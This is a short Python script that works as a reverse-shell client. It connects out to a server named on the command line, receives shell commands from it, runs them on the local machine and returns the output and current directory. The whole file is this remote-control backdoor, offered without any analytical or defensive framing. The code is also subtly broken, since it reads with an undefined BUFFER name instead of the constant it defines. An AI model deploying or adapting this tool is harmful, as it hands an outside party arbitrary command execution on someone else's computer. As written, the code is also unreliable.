import os
import sys
import socket
import subprocess

SERVER_HOST = sys.argv[1]
SERVER_PORT = 7001
MAX_MESSAGE_SIZE = 1024 * 128
SEPARATOR = "<sep>"

# create a socket object & initiate the connection
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
check_user = os.getcwd()
s.send(check_user.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()